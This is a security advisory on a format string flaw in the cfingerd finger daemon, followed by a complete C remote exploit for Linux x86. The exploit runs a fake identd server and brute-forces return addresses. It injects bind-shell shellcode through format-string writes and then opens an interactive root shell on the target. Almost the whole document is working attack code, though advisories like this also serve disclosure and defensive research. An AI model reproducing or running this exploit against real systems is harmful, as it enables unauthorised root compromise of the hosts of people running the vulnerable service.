source: http://www.securityfocus.com/bid/2576/info
 
A format string bug in the logging facility of the cfingerd "Configurable Finger Daemon" allows remote users to attain root privileges and execute arbitrary code.
 
cfingerd queries and logs the remote username of users of the service. If an attacker sets up a remote machine that returns specific format strings instead of a valid username, and connects to cfingerd from that machine, he can exploit the format string bugs. Because cfingerd runs as root, this means the attacker gains full control of the cfingerd host.
 
An exploit is available against x86 versions of cfingerd.
 
/* remote exploit for linux/x86 - cfingerd <= 1.4.3
 * coded by venomous of rdC - 16/apr/01
 *
 * Its just a common formatstring bug using syslog() incorrectly.
 * We need to bind as identd, so disable your identd in case you are
 * using it.
 *
 * BONUS: eip address is bruteforced, so relax and wait =)
 *
 * NOTE: for sure where we control the format string will change from
 *       platform to platform.
 *       And for sure, the shellcode address will change so maybe you
 *       want to bruteforce this too. (-1500 to +1500 should be fine i guess)
 *
 * REMEMBER: this code is for educational propourses only, do not use
 *           it on machines without authorization.
 *
 * INFO: cfingerd isnt a package of slackware 7.0
 *       cfingerd 1.4.1 is a package of debian 2.2
 *
 * Greets: ka0z, bruj0, dn0, superluck, fugitivo(!)
 *         #flatline, #rdC
 *
 * Credits: To Lez, who found this bug.
 *
 * http://www.rdcrew.com.ar - Argentinian Security Group.
 * venomous@rdcrew.com.ar
 */


#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define ROOTSHELLPORT 36864

void chld_timeo();
void chld_timeoo();

int sserver;
int cserver;
int phase=0;
int mmm=0;

unsigned long glob;
//unsigned long startaddr = 0xbffffdfc;
unsigned long startaddr = 0xbffffb34;
unsigned long stopaddr  = 0xbffff000;

char pbuf[1024];

char testcode[]=
    "\xeb\x0b\x2e\x72\x64\x43\x2e\x72\x6f\x63\x6b\x73\x2e\xeb\xfe";

char linuxcode[]=
    /* Lamagra bind shellcode modified by me, making it smaller =) - 124b */
    "\xeb\x6e\x5e\x29\xc0\x89\x46\x10"
    "\x40\x89\xc3\x89\x46\x0c\x40\x89"
    "\x46\x08\x8d\x4e\x08\xb0\x66\xcd"
    "\x80\x43\xc6\x46\x10\x10\x88\x46"
    "\x08\x31\xc0\x31\xd2\x89\x46\x18"
    "\xb0\x90\x66\x89\x46\x16\x8d\x4e"
    "\x14\x89\x4e\x0c\x8d\x4e\x08\xb0"
    "\x66\xcd\x80\x89\x5e\x0c\x43\x43"
    "\xb0\x66\xcd\x80\x89\x56\x0c\x89"
    "\x56\x10\xb0\x66\x43\xcd\x80\x86"
    "\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0"
    "\x3f\x41\xcd\x80\xb0\x3f\x41\xcd"
    "\x80\x88\x56\x07\x89\x76\x0c\x87"
    "\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80"
    "\xe8\x8d\xff\xff\xff\x2f\x62\x69"
    "\x6e\x2f\x73\x68";

struct os
{
    int id;
    char *os;
    char *shellcode;
    int fsc;
    unsigned long shaddr;
    int offset;
};

struct os types[]=
{
    {0, "slackware 7.0 - compiled cfingerd 1.4.2/1.4.3 running from inetd as root",
linuxcode, 22, 0xbffffbc4, 30},
    {1, "slackware 7.0 - compiled cfingerd 1.4.2/1.4.3 running from inetd as nobody",
linuxcode, 22, 0xbffffbc4, 30},
    {2, "debian 2.2 - default cfingerd 1.4.1 running from inetd as root", linuxcode, 33,
0xbffffb48, 0},
    {3, "debian 2.2 - default cfingerd 1.4.1 running from inetd as nobody", linuxcode, 33,
0xbffffb48, 0},
    {4, NULL, 0, 0xdeadbeef, 0}
};

main(int argc, char *argv[])
{
    struct sockaddr_in sin;
    struct sockaddr_in ssin;
    int fd;
    int x;
    int xx=0;
    int sts=0;
    int pete;
    int a,b,c=22,d=0; /* c is used in case you want to seek the fsc on   */
    int guide=1;      /* your system, starting from 22, change it if you */
    int sel=0;        /* want.                                           */
    int bleh=0;       /*                                                 */
    int off=0;
    int arx=0;
    int niu=0;
    int ye=0;
    char buf[1024];
    char tex[512];

    if (argc < 4)
    {
        printf("cfingerd <= 1.4.3 remote exploit coded by venomous of rdC\n\n");
        printf("Usage: %s <platform> <host> <offset>\n",argv[0]);
        printf("where <platform> is:\n");
        for (x=0 ; types[x].os != NULL ; x++)
            printf("%d for %s\n", types[x].id, types[x].os);
        printf("\nhttp://www.rdcrew.com.ar\n\n");
        exit(1);
    }

    for (x=0 ; types[x].os != NULL ; x++)
    {
        if (types[x].id == atoi(argv[1]) )
        {
            xx++;
            sel = types[x].id;
        }
    }
    if (!xx)
    {
        printf("Unknown platform: %s\n",argv[1]);
        exit(1);
    }

    off = atoi(argv[3]);
    printf("Selected platform: %s (%d)\n",types[sel].os,sel);
    bzero(&sin,sizeof(sin));

    // fake identd
    sin.sin_family = AF_INET;
    sin.sin_port = htons(113);
    sin.sin_addr.s_addr = htonl(INADDR_ANY);

    if ( (fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("socket");
        exit(1);
    }
    if ( (x = bind(fd,(struct sockaddr *)&sin, sizeof(sin)) < 0))
    {
        perror("bind");
        exit(1);
    }

    if ( (xx = listen(fd, 5)) < 0)
    {
        perror("listen");
        exit(1);
    }

    printf("fake identd bound successfuly\n\n");
    printf("pre-phase info: If you need to use the offset you can use safely steps of
120\n\n");
    printf("phase 0: finding eip...  \n");
    while (guide)
    {
        //maybe you need it..
        //        if (!d)
        //        {
        preparebuf(sel, off, ye);
        fconnect(argv[2], ye, 79);
        //        }

        pete = sizeof(ssin);
        if ( (sserver = accept(fd, (struct sockaddr *)&ssin, &pete)) < 0)
        {
            perror("accept");
            exit(1);
        }
        bzero(buf,sizeof(buf));
        read(sserver,buf,sizeof(buf));

        //horrendus debug! :)
#ifdef DEBUG
        printf("\nread(): %s\n",buf);
#endif
        sscanf(buf,"%d,%d",&a,&b);
        bzero(buf,sizeof(buf));
        bzero(tex,sizeof(tex));
        memset(tex,'\x90',119);

        bleh=strlen(pbuf);
        niu = 0;

        while (1)
        {
            if(strlen(pbuf) < 65)
            {
                if (phase==0)
                    pbuf[bleh] = '\x90';
                else
                    pbuf[bleh] = types[sel].shellcode[niu];
                bleh++;
                if (phase==1)
                    niu++;
            }
            else
                break;
        }
        arx = niu;

        if(!phase)
            for(bleh=0 ; bleh < strlen(testcode) ; bleh++)
                tex[119 - strlen(testcode) + bleh] = testcode[bleh];

        else
        {
            if ((119 - (strlen(types[sel].shellcode) - arx)) < 0)
            {
                printf("shellcode too long, exiting\n");
                exit(0);
            }

            for ( bleh=0 ; bleh < ( (strlen(types[sel].shellcode)) - arx) ; bleh++)
                tex[119 - (strlen(types[sel].shellcode)) - arx + bleh] =
types[sel].shellcode[bleh+arx];
        }

        snprintf(buf,sizeof(buf),"%s : : : %s", tex, pbuf);
        /* usefull for find the fsc on your system.
         //snprintf(buf,sizeof(buf),"%d , %d : UNIX : 1 : AAAA%%%d$p:fsc:%d\n",a,b,c,c);
        // read about 'd' below
        if (d==2) { c++; d=0; }
        */
        write(sserver,buf,sizeof(buf));

        //the same..
#ifdef DEBUG
        printf("sent: %s\n--------------------\n",buf);
#endif
        close(sserver);
        sleep(2);

        //same..
        //      if(d)
        wait(&sts);
        //      d++;

        /* if something like tcplogd is running there will be 3 connections
         * to identd, so in that case, d==3
         */
        //if(d==2)
        //    d=0;

        if ((WEXITSTATUS(sts)) == 1) // eip/shellcode address ok (at phase 0)
        {
            phase=1; ye=1; sts=0;
            printf("\nphase 1: calculating address of the first chacarcter in our buffer...
wait\n");
        }

        if ((WEXITSTATUS(sts)) == 2) // shellcode executed (at phase 1)
        {
            printf("\nphase 2 connecting to rootshell... ");
            fflush(stdout);
            close(fd); //identd fake server
            fconnect(argv[2], 2, ROOTSHELLPORT);
            printf("\n\nThanks for using rdC products!\n\n");
            exit(0);
        }
    }
}

int fconnect(char *hname, int what, int port)
{
    struct hostent *host;
    struct sockaddr_in d;
    int r;
    char hname2[128];
    char response[1024];
    d.sin_family = AF_INET;
    d.sin_port = htons(port);

    bzero(hname2,sizeof(hname2));
    strncpy(hname2,hname,sizeof(hname2));
    host = gethostbyname(hname2);
    if (!host)
    {
        printf("cannot resolve\n");
        exit(0);
    }

    bcopy(host->h_addr, (struct in_addr *)&d.sin_addr, host->h_length);

    cserver = socket(AF_INET, SOCK_STREAM, 0);

    // you can add a timeout here, but supossly you know if the server
    // is up/not firewalled, because you are using it against an authorized
    // machine and not in a script/not authorized machine, right?

    if (connect(cserver, (struct sockaddr *)&d, sizeof(struct sockaddr)) < 0)
    {
        perror("connect");
        exit(1);
    }

    if (what==2)
    {
        printf("connected!\n");
        fflush(stdout);
        rootsox(cserver);
        close(cserver);
        return;
    }

    write(cserver,"a\n",strlen("a\n"));

    if ((fork()) == 0)
    {
        printf("Waiting response...");
        for(r=0 ; r < 19 ; r++)
            printf("\b");
        fflush(stdout);
        bzero(response,sizeof(response));
        if (what==0)
            signal(SIGALRM, chld_timeo);
        else
            signal(SIGALRM, chld_timeoo);

        alarm(30);
        read(cserver,response,sizeof(response));
        if (strstr(response,"SIGILL"))
        {
            printf("Illegal Instruction\r");
            fflush(stdout);
            close(cserver);
            exit(0);
        }
        if (strstr(response,"SIGSEGV"))
        {
            printf("Segmentation Fault.\r");
            fflush(stdout);
            close(cserver);
            exit(0);
        }
        //you might add strings here..
        if (strstr(response,"Sorry, that user doesn't exist") || strstr(response,"Debian
GNU/Linux"))
        {
            printf("server not crashed.\r");
            fflush(stdout);
            close(cserver);
            exit(0);
        }
    }
    //close(cserver);
}

/* <huh> */
void chld_timeo()
{
    alarm(0);
    signal(SIGALRM, SIG_DFL);
    printf("EIP FOUND! - SHELLCODE ADDR OK!\n");
    fflush(stdout);
    close(cserver);
    exit(1);
}

void chld_timeoo()
{
    alarm(0);
    signal(SIGALRM, SIG_DFL);
    printf("shellcode executed!\n");
    fflush(stdout);
    close(cserver);
    exit(2);
}
/* </huh> */

int rootsox(int sox)
{
    fd_set  rset;
    int     n;
    char    buffer[4096];

    /* we kill the cfingerd in eternal loop and we run other nice commands ;)
     */
    char *command="/bin/killall -9 cfingerd ; /bin/uname -a ; /usr/bin/id\n";

    send(sox, command, strlen(command), 0);

    for (;;) {
        FD_ZERO (&rset);
        FD_SET (sox, &rset);
        FD_SET (STDIN_FILENO, &rset);

        n = select(sox + 1, &rset, NULL, NULL, NULL);
        if(n <= 0)
            return (-1);

        if(FD_ISSET (sox, &rset)) {
            n = recv (sox, buffer, sizeof (buffer), 0);
            if (n <= 0)
                break;

            write (STDOUT_FILENO, buffer, n);
        }

        if(FD_ISSET (STDIN_FILENO, &rset)) {
            n = read (STDIN_FILENO, buffer, sizeof (buffer));
            if (n <= 0)
                break;

            send(sox, buffer, n, 0);
        }
    }
    return 0;
}

//heavly modified formatstring engine from rdC-LPRng.c exploit - 12/00
preparebuf(int sel, int off, int what)
{
    unsigned long addr;
    unsigned long a, b, c, d;
    int pas1,pas2,pas3,pas4;
    int i;
    char temp[512];
    char buf[512];
    char atemp[128];
    char bufx[512];

    startaddr = startaddr - 0x4;
    addr = startaddr;

    bzero(temp,sizeof(temp));
    bzero(buf,sizeof(buf));
    bzero(bufx,sizeof(bufx));
    bzero(atemp,sizeof(atemp));

    if (addr == stopaddr)
    {
        printf("\nreached stopaddr, change shellcode address/fsc\n");
        exit(1);
    }

    if(what)
    {
        off-=mmm;
        mmm++;
    }

    if (mmm == 185)
    {
        printf("?!.. we cant find the first character of our shellcode!#@\n");
        exit(0);
    }

    snprintf(temp,sizeof(temp),"%p",types[sel].shaddr+types[sel].offset+off);
    sscanf(temp,"0x%2x%2x%2x%2x",&a,&b,&c,&d);
    pas1 = d - (16 * 2);
    pas1 = cn(pas1);
    pas2 = c - d;
    pas2 = cn(pas2);
    pas3 = b - c;
    pas3 = cn(pas3);
    pas4 = a - b;
    pas4 = cn(pas4);

    if(what)
        addr = glob;
    else
        glob = addr;

    printf("eip: %p - shellcode addr: %p - ",addr,types[sel].shaddr+types[sel].offset+off);
    fflush(stdout);

    for (i=0 ; i < 4 ; i++)
    {
        snprintf(atemp,sizeof(atemp),"%s",&addr);
        strncat(buf, atemp, 4);
        addr++;
    }


snprintf(bufx,sizeof(bufx),"%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n%%.%du%%%d$n",pas1,(types[sel].fsc),pas2,(types[sel].fsc)+1,pas3,(types[sel].fsc)+2,pas4,types[sel].fsc+3);
    strcat(buf,bufx);
    bzero(pbuf,sizeof(pbuf));
    strncpy(pbuf,buf,sizeof(pbuf));
}

cn(unsigned long addr)
{
    char he[128];

    snprintf(he,sizeof(he),"%d",addr);
    if (atoi(he) < 8)
        addr = addr + 256;

    return addr;
}

